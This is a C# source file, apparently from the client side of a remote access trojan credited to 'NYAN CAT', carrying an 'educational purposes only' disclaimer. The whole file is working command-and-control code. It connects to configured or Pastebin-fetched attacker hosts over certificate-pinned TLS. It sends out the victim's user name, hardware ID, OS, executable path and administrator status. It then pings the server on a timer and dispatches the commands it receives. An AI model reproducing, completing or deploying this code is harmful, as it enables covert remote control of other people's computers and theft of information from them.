using Client.Handle_Packet;
using Client.Helper;
using Client.MessagePack;
using Microsoft.VisualBasic.Devices;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Text;
using System.Security.Principal;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Net;

//       │ Author     : NYAN CAT
//       │ Name       : Nyan Socket v0.1
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only.

namespace Client.Sockets
{
    public static class ClientSocket
    {
        public static Socket Client { get; set; }
        public static SslStream SslClient { get; set; }
        private static byte[] Buffer { get; set; }
        private static long Buffersize { get; set; }
        private static Timer Tick { get; set; }
        private static MemoryStream MS { get; set; }
        public static bool IsConnected { get; set; }
        private static object SendSync { get; } = new object();
        private static PerformanceCounter TheCPUCounter { get; } = new PerformanceCounter("Processor", "% Processor Time", "_Total");
        private static PerformanceCounter TheMemCounter { get; } = new PerformanceCounter("Memory", "% Committed Bytes In Use");

        public static void InitializeClient()
        {
            try
            {
                Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                };
                if (Settings.Pastebin == "null")
                {
                    Client.Connect(Convert.ToString(Settings.Hosts.Split(',')[new Random().Next(Settings.Hosts.Split(',').Length)]),
    Convert.ToInt16(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]));
                }
                else
                {
                    using (WebClient wc = new WebClient())
                    {
                        NetworkCredential networkCredential = new NetworkCredential("", "");
                        wc.Credentials = networkCredential;
                        string resp = wc.DownloadString(Settings.Pastebin);
                        string[] spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
                        Settings.Hosts = spl[0];
                        Settings.Ports = spl[new Random().Next(1, spl.Length)];
                        Client.Connect(Settings.Hosts, Convert.ToInt16(Settings.Ports));
                    }
                }
                if (Client.Connected)
                {
                    Debug.WriteLine("Connected!");
                    IsConnected = true;
                    SslClient = new SslStream(new NetworkStream(Client, true), false, ValidateServerCertificate);
                    SslClient.AuthenticateAsClient(Client.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
                    Buffer = new byte[4];
                    MS = new MemoryStream();
                    Send(SendInfo());
                    Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
                    SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
                }
            }
            catch
            {
                Debug.WriteLine("Disconnected!");
                IsConnected = false;
            }
        }

        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
#if DEBUG
            return true;
#endif
            return Settings.ServerCertificate.Equals(certificate);
        }

        public static void Reconnect()
        {

            try
            {
                Tick?.Dispose();
                SslClient?.Dispose();
                Client?.Dispose();
                MS?.Dispose();
            }
            finally
            {
                InitializeClient();
            }
        }

        public static byte[] SendInfo()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
            msgpack.ForcePathObject("HWID").AsString = Methods.HWID();
            msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " +
                Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
            msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
            msgpack.ForcePathObject("Version").AsString = Settings.Version;
            msgpack.ForcePathObject("Admin").AsString = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString().ToLower().Replace("true", "Administrator").Replace("false", "User");
            TheCPUCounter.NextValue();
            msgpack.ForcePathObject("Performance").AsString = $"CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
            msgpack.ForcePathObject("Pastebin").AsString = Settings.Pastebin;
            return msgpack.Encode2Bytes();
        }

        public static void ReadServertData(IAsyncResult ar)
        {
            try
            {
                if (!Client.Connected || !IsConnected)
                {
                    IsConnected = false;
                    return;
                }
                int recevied = SslClient.EndRead(ar);
                if (recevied > 0)
                {
                    MS.Write(Buffer, 0, recevied);
                    if (MS.Length == 4)
                    {
                        Buffersize = BitConverter.ToInt32(MS.ToArray(), 0);
                        Debug.WriteLine("/// Client Buffersize " + Buffersize.ToString() + " Bytes  ///");
                        MS.Dispose();
                        MS = new MemoryStream();
                        if (Buffersize > 0)
                        {
                            Buffer = new byte[Buffersize];
                            while (MS.Length != Buffersize)
                            {
                                int rc = SslClient.Read(Buffer, 0, Buffer.Length);
                                if (rc == 0)
                                {
                                    IsConnected = false;
                                    return;
                                }
                                MS.Write(Buffer, 0, rc);
                                Buffer = new byte[Buffersize - MS.Length];
                            }
                            if (MS.Length == Buffersize)
                            {
                                ThreadPool.QueueUserWorkItem(Packet.Read, MS.ToArray());
                                Buffer = new byte[4];
                                MS.Dispose();
                                MS = new MemoryStream();
                            }
                            else
                                Buffer = new byte[Buffersize - MS.Length];
                        }
                    }
                    SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
                }
                else
                {
                    IsConnected = false;
                    return;
                }
            }
            catch
            {
                IsConnected = false;
                return;
            }
        }

        public static void Send(byte[] msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!Client.Connected || !IsConnected)
                    {
                        IsConnected = false;
                        return;
                    }

                    if (msg == null) return;

                    byte[] buffer = msg;
                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);

                    Client.Poll(-1, SelectMode.SelectWrite);
                    SslClient.Write(buffersize, 0, buffersize.Length);
                    SslClient.Write(buffer, 0, buffer.Length);
                    SslClient.Flush();
                }
                catch
                {
                    IsConnected = false;
                    return;
                }
            }
        }

        public static void CheckServer(object obj)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Ping";
            msgpack.ForcePathObject("Message").AsString = $"CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
            Send(msgpack.Encode2Bytes());
        }

    }
}